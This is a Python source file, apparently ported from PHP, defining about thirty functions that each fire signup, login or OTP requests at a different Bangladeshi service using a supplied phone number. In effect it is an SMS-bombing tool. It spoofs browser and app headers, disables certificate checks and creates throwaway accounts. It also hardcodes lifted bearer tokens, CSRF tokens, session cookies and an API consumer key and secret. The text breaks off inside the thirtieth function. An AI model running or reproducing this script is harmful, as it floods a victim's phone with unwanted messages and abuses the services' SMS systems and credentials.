import requests
import random
import string
import time
import json
import asyncio
import aiohttp
from flask import Flask, request, jsonify


def call_api1(phone: str) -> None:
    """
    Equivalent to api1.php:
    Sends signup request to https://api.redx.com.bd/v1/user/signup
    """
    url = "https://api.redx.com.bd:443/v1/user/signup"
    data = {
        "name": phone,
        "service": "redx",
        "phoneNumber": phone,
    }

    try:
        # verify=False corresponds to disabling SSL verification in the PHP cURL
        resp = requests.post(
            url,
            json=data,
            headers={"Content-Type": "application/json"},
            verify=False,
        )
        resp.raise_for_status()
        print("Response:\n", resp.text)
    except requests.RequestException as e:
        print("Error:", e)


def call_api2(phone: str) -> None:
    """
    Equivalent to api2.php:
    Two-step POST to https://www.khaasfood.com/wp-admin/admin-ajax.php
    """
    csrf = "9d9d08e6e5"
    url = "https://www.khaasfood.com/wp-admin/admin-ajax.php"

    # Normalize to +880XXXXXXXXXXX format (e.g. input 01313... → +8801313...)
    raw = phone.strip().lstrip("+")
    if raw.startswith("880"):
        mobile_e164 = "+" + raw
    elif raw.startswith("0"):
        mobile_e164 = "+880" + raw[1:]
    else:
        mobile_e164 = "+880" + raw

    data1 = {
        "mobileNo": mobile_e164,
        "countrycode": "+880",
        "csrf": csrf,
        "login": "1",
        "json": "1",
        "action": "digits_check_mob",
    }
    headers1 = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://www.khaasfood.com",
        "referer": "https://www.khaasfood.com/",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": "Mozilla/5.0",
    }

    try:
        r1 = requests.post(url, data=data1, headers=headers1)
        status1 = r1.status_code
        response1 = r1.text
    except requests.RequestException as e:
        status1 = 0
        response1 = f"Error: {e}"

    postData2 = {
        "mobileNo": mobile_e164,
        "digits_reg_mail": mobile_e164,
        "dig_nounce": csrf,
        "action": "digits_check_mob",
        "login": "2",
        "countrycode": "+880",
        "digregcode": "+880",
        "digregcode2": "+880",
        "digits": "1",
        "dtype": "2",
        "json": "1",
        "csrf": csrf,
    }
    headers2 = {
        "accept": "*/*",
        "origin": "https://www.khaasfood.com",
        "referer": "https://www.khaasfood.com/",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": "Mozilla/5.0",
    }

    try:
        r2 = requests.post(url, data=postData2, headers=headers2)
        status2 = r2.status_code
        response2 = r2.text
    except requests.RequestException as e:
        status2 = 0
        response2 = f"Error: {e}"

    print(f"NUMBER: {phone}\n")
    print(f"STEP 1 STATUS: {status1}")
    print(response1)
    print("\n----------------------\n")
    print(f"STEP 2 STATUS: {status2}")
    print(response2)


def call_api3(phone: str) -> None:
    """
    Equivalent to api3.php:
    POST JSON to bioscopelive login endpoint with +88 prefix.
    """
    phone_with_cc = "+88" + phone
    url = "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en"

    data = {"number": phone_with_cc}

    headers = {
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9,ru;q=0.8,zh-TW;q=0.7,zh;q=0.6",
        "authorization": "",
        "cache-control": "no-cache",
        "content-type": "application/json",
        "origin": "https://www.bioscopeplus.com",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://www.bioscopeplus.com/",
        "sec-ch-ua": '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
        ),
    }

    try:
        resp = requests.post(url, json=data, headers=headers)
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("cURL Error:", e)


def call_api4(phone: str) -> None:
    """
    Equivalent to api4.php:
    GET to bikroy phone login endpoint with headers.
    """
    url = (
        "https://bikroy.com/data/phone_number_login/verifications/phone_login"
        f"?phone={requests.utils.quote(phone)}"
    )

    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en",
        "application-name": "web",
        "cookie": (
            "_gcl_au=1.1.558893198.1713351434; _fbp=fb.1.1713351434502.667827785; "
            "locale=en; ab-test.pwa-only=reactapp; _sp_ses.c10b=*; "
            "_ga=GA1.2.1936000234.1713351434; _gid=GA1.2.886237652.1715507924; "
            "_dc_gtm_UA-33150711-4=1; _dc_gtm_UA-32287732-10=1; "
            "__gads=ID=01441cfb2260236f:T=1713812228:RT=1715508001:"
            "S=ALNI_Ma73d8yydsNVRzHsy4bzp87fPN2_g; "
            "__gpi=UID=00000df6182217ab:T=1713812228:RT=1715508001:"
            "S=ALNI_MZx1RypsjFJOqcm0gkMZdTDproh9Q; "
            "__eoi=ID=068c2c606fbed755:T=1713812228:RT=1715508001:"
            "S=AA-AfjZz7tYE_5lM99OfpjQk05st; "
            'FCNEC=[["AKsRol8cmy97NhkamWuj3Fa-UoC-kj0iFuJHyfgYY6ns9NGpGOmMJlPwFOIiu1GFVQhOyj5knWTBgx3yEHFkJi0Rk5odprMIooS0In-_6pbk4aSxjHmy27dV70rNgj1BoGUMus5ylPqCXe4gSnHbroqqvT116cKzXg=="]]; '
            "_ga_LK6CFX94RC=GS1.2.1715507924.7.1.1715507939.45.0.0; "
            "_sp_id.c10b=119acd62983c32e0.1709924485.8.1715507940.1714164260."
            "2bcad174-00f9-4870-918f-465c4f80b973; "
            "_ga_LV7HJQBLZX=GS1.1.1715507923.4.1.1715507939.44.0.0"
        ),
        "priority": "u=1, i",
        "referer": "https://bikroy.com/en?login-modal=true&redirect-url=/en",
        "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        ),
    }

    try:
        resp = requests.get(url, headers=headers)
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("Error:", e)


def random_string(length: int = 8) -> str:
    chars = string.ascii_lowercase + string.digits
    return "".join(random.choice(chars) for _ in range(length))


def call_api5(phone: str) -> None:
    """
    Equivalent to api5.php:
    Generates random name/email, sends sign-up request to Proiojon API.
    """
    random_name = random_string(10)
    random_email = random_string(12) + "@gmail.com"

    url = "https://billing.proiojon.com/api/v1/auth/sign-up"

    data = {
        "name": random_name,
        "phone": phone,
        "email": random_email,
        "password": "password123",
        "ref_code": "",
    }

    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9,ru;q=0.8,zh-TW;q=0.7,zh;q=0.6",
        "authorization": "Bearer null",
        "cache-control": "no-cache",
        "content-type": "application/json; charset=UTF-8",
        "latitude": '"23.542089492895155"',
        "longitude": '"89.1771454546833"',
        "origin": "https://proiojon.com",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://proiojon.com/",
        "sec-ch-ua": '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
        ),
        "x-localization": "en",
        "zoneid": "[2]",
    }

    try:
        resp = requests.post(url, json=data, headers=headers, verify=False)
        text = resp.text
    except requests.RequestException as e:
        text = f"CURL ERROR: {e}"

    print(f"Random Name: {random_name}")
    print(f"Random Email: {random_email}")
    print(f"Phone Used: {phone}\n")
    print("API Response:\n" + text)


def call_api6(phone: str) -> None:
    """
    Equivalent to api6.php:
    POST JSON to beautybooth signup endpoint with dynamic phone.
    """
    url = "https://admin.beautybooth.com.bd/api/v2/auth/signup"
    payload = {"phone": phone}

    headers = {
        "User-Agent": "Dart/2.19 (dart:io)",
        "Accept": "application/json",
        "Accept-Encoding": "gzip",
        "Content-Type": "application/json; charset=utf-8",
    }

    try:
        resp = requests.post(url, json=payload, headers=headers)
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("cURL Error #:", e)


def call_api7(phone: str) -> None:
    """
    Equivalent to api7.php:
    Sends OTP via developer.medha.info API with formatted 880XXXXXXXXXX number.
    """
    if not phone:
        print("Error: Phone number is required.")
        return

    formatted_phn = "880" + phone.lstrip("0")

    url = "https://developer.medha.info/api/send-otp"
    payload = {"phone": formatted_phn, "is_register": "1"}

    headers = {
        "User-Agent": "Dart/3.2 (dart:io)",
        "Accept-Encoding": "gzip",
        "content-type": "application/json; charset=utf-8",
        "authorization": "Bearer",
    }

    try:
        resp = requests.post(url, json=payload, headers=headers, timeout=30)
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("cURL Error #:", e)


def call_api8(phone: str) -> None:
    """
    Equivalent to api8.php:
    POST JSON to deeptoplay login endpoint with +88 prefix.
    """
    number = "+88" + phone
    url = "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en"

    data = {"number": number}

    headers = {
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9,ru;q=0.8,zh-TW;q=0.7,zh;q=0.6",
        "authorization": "",
        "cache-control": "no-cache",
        "content-type": "application/json",
        "origin": "https://www.deeptoplay.com",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://www.deeptoplay.com/",
        "sec-ch-ua": '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
        ),
    }

    try:
        resp = requests.post(url, json=data, headers=headers, verify=False)
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("cURL ERROR:", e)


def call_api9(phone: str) -> None:
    """
    Equivalent to api9.php:
    Sends OTP via Robi web API with bearer token.
    """
    url = "https://webapi.robi.com.bd/v1/send-otp"

    headers = {
        "Authorization": (
            "Bearer "
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9."
            "eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY5MjY0MjcyOCwibmJmIjoxNjkyNjQyNzI4LCJleHAiOjE2OTI2NDYzMjgsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ."
            "5xbPa1JiodXeIST6v9c0f_4thF6tTBzaLLfuHlN7NSc"
        ),
        "Content-Type": "application/json",
    }

    payload = {
        "phone_number": phone,
        "type": "doorstep",
    }

    try:
        resp = requests.post(url, json=payload, headers=headers, verify=False)
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("Error:", e)


def call_api10(phone: str) -> None:
    """
    Equivalent to api10.php:
    Sends one multipart/form-data SMS request via Arogga API.
    """
    url = "https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome&v=122.0.0.0&os=Windows&osv=10"

    boundary = "----WebKitFormBoundaryYpsCATbORcIEoBtS"

    headers = {
        "authority": "api.arogga.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": f"multipart/form-data; boundary={boundary}",
        "origin": "https://www.arogga.com",
        "referer": "https://www.arogga.com/",
        "sec-ch-ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
        ),
    }

    post_data = {
        "mobile": phone,
        "fcmToken": "",
        "referral": "",
    }

    # Build raw multipart body to mirror PHP behavior
    lines = []
    for key, value in post_data.items():
        lines.append(f"--{boundary}")
        lines.append(f'Content-Disposition: form-data; name="{key}"')
        lines.append("")
        lines.append(value)
    lines.append(f"--{boundary}--")
    body = "\r\n".join(lines)

    try:
        resp = requests.post(url, data=body, headers=headers, verify=False)
        resp.raise_for_status()
        print(f"Request 0 Response: {resp.text}")
    except requests.RequestException as e:
        print("Error:", e)


def call_api11(phone: str) -> None:
    """
    Equivalent to api11.php:
    Send common OTP via mygp.cinematic.mobi.
    """
    url = f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/wap/{phone}"

    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9,ru;q=0.8",
        "Connection": "keep-alive",
        "Content-Type": "application/json;charset=UTF-8",
        "Origin": "https://cinematic.mobi",
        "Referer": "https://cinematic.mobi/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        ),
        "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        "headers": {
            "Content-Type": "application/json",
            "Access-Control-Allow-Origin": "*",
            "Authorization": "Bearer 1pake4mh5ln64h5t26kpvm3iri",
        }
    }

    try:
        resp = requests.post(url, json=data, headers=headers)
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("Error:", e)


def call_api12(phone: str) -> None:
    """
    Equivalent to api12.php:
    Save OTP info via bdstall.com.
    """
    url = "https://www.bdstall.com/userRegistration/save_otp_info/"

    fields = {
        "UserTypeID": "2",
        "RequestType": "1",
        "Name": "Md",
        "Mobile": phone,
    }

    try:
        resp = requests.post(url, data=fields)
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("Curl error:", e)


def call_api13(phone: str) -> None:
    """
    Equivalent to api13.php:
    Generate OTP via bcsexamaid.com.
    """
    url = "https://bcsexamaid.com/api/generateotp"

    payload = {
        "mobile": phone,
        "softtoken": "Rifat.Admin.2022",
    }

    headers = {
        "User-Agent": "Dart/3.1 (dart:io)",
        "Accept": "application/json",
        "Accept-Encoding": "gzip",
        "Content-Type": "application/json; charset=utf-8",
    }

    try:
        resp = requests.post(url, json=payload, headers=headers, timeout=30)
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("cURL Error #:", e)


def call_api14(phone: str) -> None:
    """
    Equivalent to api14.php:
    Send OTP via doctorlivebd.com.
    """
    if not phone:
        print("Error: Phone number is required.")
        return

    phn = phone.lstrip("0")

    url = "https://doctorlivebd.com/api/patient/auth/otpsend"

    data = {
        "country_code": "880",
        "mobile": phn,
    }

    headers = {
        "User-Agent": "okhttp/4.10.0",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    try:
        resp = requests.post(url, data=data, headers=headers, timeout=30)
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("cURL Error #:", e)


def call_api15(phone: str) -> None:
    """
    Equivalent to api15.php:
    Generate token then shoot OTP via sheba.xyz.
    """

    def make_http_request(url: str, json_data: dict | None = None) -> str:
        try:
            if json_data is not None:
                r = requests.post(url, json=json_data, headers={"Content-Type": "application/json"})
            else:
                r = requests.get(url)
            r.raise_for_status()
            return r.text
        except requests.RequestException as e:
            return f"ERROR: {e}"

    generate_token_url = (
        "https://accounts.sheba.xyz/api/v1/accountkit/generate/token"
        "?app_id=8329815A6D1AE6DD"
    )
    token_response = make_http_request(generate_token_url)

    try:
        token_data = json.loads(token_response)
        api_token = token_data.get("token")
    except Exception:
        api_token = None

    mobile_number = "+88" + phone

    shoot_otp_url = "https://accountkit.sheba.xyz/api/shoot-otp"
    data = {
        "mobile": mobile_number,
        "app_id": "8329815A6D1AE6DD",
        "api_token": api_token,
    }

    shoot_otp_response = make_http_request(shoot_otp_url, data)
    print("Shoot OTP Response:", shoot_otp_response)


def call_api16(phone: str) -> None:
    """
    Equivalent to api16.php:
    Login via apex4u.com with phoneNumber.
    """
    url = "https://api.apex4u.com/api/auth/login"

    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en;q=0.9,ru;q=0.8",
        "content-type": "application/json",
        "origin": "https://apex4u.com",
        "referer": "https://apex4u.com/",
        "user-agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
        ),
    }

    data = {"phoneNumber": phone}

    try:
        resp = requests.post(url, json=data, headers=headers, timeout=5)
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("Curl error:", e)


def call_api17(phone: str) -> None:
    """
    Equivalent to api17.php:
    Send mobile OTP via Sindabad API (requires +88 prefix).
    """
    if not phone:
        print("Error: phone parameter missing.")
        return

    full_phone = "+88" + phone
    url = "https://offers.sindabad.com/api/mobile-otp"

    post_data = {
        "key": "c94e67fb2a59af3b6fa21f24463b2061",
        "mobile": full_phone,
    }

    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9,ru;q=0.8,zh-TW;q=0.7,zh;q=0.6",
        "Authorization": (
            "Bearer "
            "ODdweWQ2OTJwbDNiYjR6azMyazJpenBrdHQ2MjYybnZhc2luZGFiYWRjb21tb3ppbGxhNTAg"
            "d2luZG93cyBudCAxMDAgd2luNjQgeDY0IGFwcGxld2Via2l0NTM3MzYga2h0bWwgbGlrZSBn"
            "ZWNrbyBjaHJvbWUxNDMwMDAgc2FmYXJpNTM3MzZiYW5kb3JjOTRlNjdmYjJhNTlhZjNiNmZh"
            "MjFmMjQ0NjNiMjA2MQ=="
        ),
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Origin": "https://sindabad.com",
        "Pragma": "no-cache",
        "Referer": "https://sindabad.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
        ),
        "sec-ch-ua": '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        'sec-ch-ua-platform': '"Windows"',
    }

    try:
        resp = requests.post(url, json=post_data, headers=headers, timeout=15)
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("cURL Error:", e)


def call_api18(phone: str) -> None:
    """
    Equivalent to api18.php:
    Send login OTP via app.kireibd.com.
    """
    url = "https://app.kireibd.com/api/v2/send-login-otp"

    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        ),
        "Content-Type": "application/json",
        "x-xsrf-token": (
            "eyJpdiI6Imh2dU9zVk9rQUR5TjlsQVBvd2F2cVE9PSIsInZhbHVlIjoiQlZUdXlHcmpES2FG"
            "UXBja1dZbUZXZG9MVksreEwxa1ZzZGgzYml3MHIxMmlraURSTjVLUnpPY0ZEeEJmSldqNGNa"
            "OG5rc0FNYkVDMlJqakJmZGVlckdvNVFobnBzTFpOSnpsbVZENlVvUW5JSHhvMkYxd1VKcG9Z"
            "c0tmTUlEdUQiLCJtYWMiOiJiZjIwNmQ0OWNlZTFiYWMyZWQ4YWRmMTEzYjAwNWFkOTNmOTgz"
            "MzRiODJlZWMxOWM0MTFhOGNkODhjNzQzZWQxIiwidGFnIjoiIn0="
        ),
    }

    data = {"email": phone}

    try:
        resp = requests.post(url, json=data, headers=headers, verify=False)
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("Error:", e)


def call_api19(phone: str) -> None:
    """
    Equivalent to api19.php:
    Send SMS via Shikho API.
    """
    url = "https://api.shikho.com/auth/v2/send/sms"

    data = {
        "phone": phone,
        "type": "student",
        "auth_type": "signup",
        "vendor": "shikho",
    }

    headers = {
        "Host": "api.shikho.com",
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) "
            "Gecko/20100101 Firefox/109.0"
        ),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/json",
        "Origin": "https://app.shikho.com",
        "Connection": "keep-alive",
        "Referer": "https://app.shikho.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
    }

    try:
        resp = requests.post(url, json=data, headers=headers)
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("cURL error:", e)


def call_api20(phone: str) -> None:
    """
    Equivalent to api20.php:
    Signup via reseller.circle.com.bd with +88 phone.
    """
    url = "https://reseller.circle.com.bd/api/v2/auth/signup"

    headers = {
        "User-Agent": (
            "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)"
        ),
        "Content-Type": "application/json",
    }

    payload = {
        "name": "+88" + phone,
        "email_or_phone": "+88" + phone,
        "password": "123456",
        "password_confirmation": "123456",
        "register_by": "phone",
    }

    try:
        resp = requests.post(url, json=payload, headers=headers, verify=False)
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("Error:", e)


def call_api21(phone: str) -> None:
    """
    Equivalent to api21.php:
    Auth via BDTickets API with +88 phone.
    """
    phone_formatted = "+88" + phone
    url = "https://api.bdtickets.com:20100/v1/auth"

    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en;q=0.9,ru;q=0.8,zh-TW;q=0.7,zh;q=0.6",
        "cache-control": "no-cache",
        "content-type": "application/json",
        "origin": "https://bdtickets.com",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://bdtickets.com/",
        "sec-ch-ua": '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        'sec-ch-ua-platform': '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
        ),
    }

    data = {
        "createUserCheck": True,
        "phoneNumber": phone_formatted,
        "applicationChannel": "WEB_APP",
    }

    try:
        resp = requests.post(url, json=data, headers=headers)
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("cURL Error:", e)


def call_api22(phone: str) -> None:
    """
    Equivalent to api22.php:
    Request OTP via bkshopthc.grameenphone.com.
    """
    url = "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp"

    data = {
        "phone": phone,
        "email": "",
        "language": "en",
    }

    headers = {
        "Content-Type": "application/json",
        "User-Agent": (
            "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) "
            "AppleWebKit/537.36"
        ),
    }

    try:
        resp = requests.post(url, json=data, headers=headers)
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("Error:", e)


def call_api23(phone: str) -> None:
    """
    Equivalent to api23.php:
    Login to rflbestbuy.com (BestBuy) using phone as email/phone.
    """
    api_url = "https://rflbestbuy.com/api/login/?lang_code=en&currency_code=BDT"

    headers = {
        "Host": "rflbestbuy.com",
        "Authorization": (
            "Bearer "
            "bWlzNTdAcHJhbmdyb3VwLmNvbTpJWE94N1NVUFYwYUE0Rjg4Nmg4bno5V2I2STUzNTNBQQ=="
        ),
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/4.2.2",
    }

    data = {
        "company_id": "26",
        "password2": "Riyaz@123",
        "currency_code": "BDT",
        "user_type": "C",
        "email": f"{phone}@gmail.com",
        "g_id": "",
        "lang_code": "en",
        "operating_system": "Android",
        "otp_verify": False,
        "password1": "Riyaz@123",
        "phone": phone,
        "storefront_id": "3",
    }

    try:
        resp = requests.post(api_url, json=data, headers=headers)
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("Error:", e)


def call_api24(phone: str) -> None:
    """
    Equivalent to api24.php:
    Login via Chorki mobile API.
    """
    if not phone:
        print("Phone number is required.")
        return

    url = "https://api-dynamic.chorki.com/v1/auth/login?country=BD&platform=mobile"

    headers = {
        "User-Agent": "Chorki/2.0.33 (Android 13; GM1917; GM1917; arm64-v8a)",
        "Accept": "application/json",
        "Content-Type": "application/json",
    }

    payload = {"number": phone}

    try:
        resp = requests.post(url, json=payload, headers=headers, timeout=30)
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("cURL Error #:", e)


def call_api25(phone: str) -> None:
    """
    Equivalent to api25.php:
    Login status via hishabexpress.com.
    """
    url = "https://api.hishabexpress.com/login/status"

    headers = {
        "user-agent": "Dart/2.19 (dart:io)",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    data = {
        "msisdn": phone,
        "hash": "Hello",
    }

    try:
        resp = requests.post(url, data=data, headers=headers, verify=False)
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("Error:", e)


def call_api26(phone: str) -> None:
    """
    Equivalent to api26.php:
    Check auth via mujib.chorcha.net.
    """
    url = f"https://mujib.chorcha.net/auth/check?phone={requests.utils.quote(phone)}"

    headers = {
        "accept": "*/*",
        "x-chorcha-mode": "prod",
        "x-chorcha-platform": "web",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    }

    try:
        resp = requests.get(url, headers=headers)
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("cURL Error:", e)


def call_api27(phone: str) -> None:
    """
    Equivalent to api27.php:
    Send OTP via Wafilife backend.
    """
    url = (
        "https://m-backend.wafilife.com/wp-json/wc/v2/send-otp"
        "?p="
        f"{phone}"
        "&consumer_key=ck_e8c5b4a69729dd913dce8be03d7878531f6511ff"
        "&consumer_secret=cs_f866e5c6543065daa272504c2eea71044579cff3"
    )

    try:
        resp = requests.get(url)
        code = resp.status_code
        print("Response Code:", code)
        print("Response Content:", resp.text)
    except requests.RequestException as e:
        print("Error:", e)


def call_api28(phone: str) -> None:
    """
    Equivalent to api28.php:
    Register OTP via webapi.robi.com.bd.
    """
    url = "https://webapi.robi.com.bd/v1/account/register/otp"

    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) "
            "Gecko/20100101 Firefox/109.0"
        ),
        "X-CSRF-TOKEN": (
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9."
            "eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY4MTQ3MjU5NiwibmJmIjoxNjgxNDcyNTk2"
            "LCJleHAiOjE2ODE0NzYxOTYsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJT"
            "aXRlVjIifQ.-k1ByaD69rmEy1NXzEIT08fJvZ9c6OysjmaQfe8hEz0"
        ),
        "Authorization": (
            "Bearer "
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9."
            "eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY4MTQ3MjU5NiwibmJmIjoxNjgxNDcyNTk2"
            "LCJleHAiOjE2ODE0NzYxOTYsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJT"
            "aXRlVjIifQ.-k1ByaD69rmEy1NXzEIT08fJvZ9c6OysjmaQfe8hEz0"
        ),
        "Content-Type": "application/json",
    }

    data = {"phone_number": phone}

    try:
        resp = requests.post(url, json=data, headers=headers, verify=False)
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("Error:", e)


def call_api29(phone: str) -> None:
    """
    Equivalent to api29.php:
    Send OTP via api.chardike.com.
    """
    url = "https://api.chardike.com/api/otp/send"
    payload = {
        "phone": phone,
        "otp_type": "login",
    }
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9,ru;q=0.8,zh-TW;q=0.7,zh;q=0.6",
        "cache-control": "no-cache",
        "content-type": "application/json",
        "origin": "https://chardike.com",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://chardike.com/",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
        ),
    }

    try:
        resp = requests.post(url, json=payload, headers=headers)
        resp.raise_for_status()
        print("Chardike OTP Response:", resp.text)
    except requests.RequestException as e:
        print("Error:", e)


def call_api30(phone: str) -> None:
    """
    Equivalent to api30.php:
    Exists check then send OTP via prod.etestpaper.net.
    """
    headers = {
        "accept": "application/json, text/plain, */*",
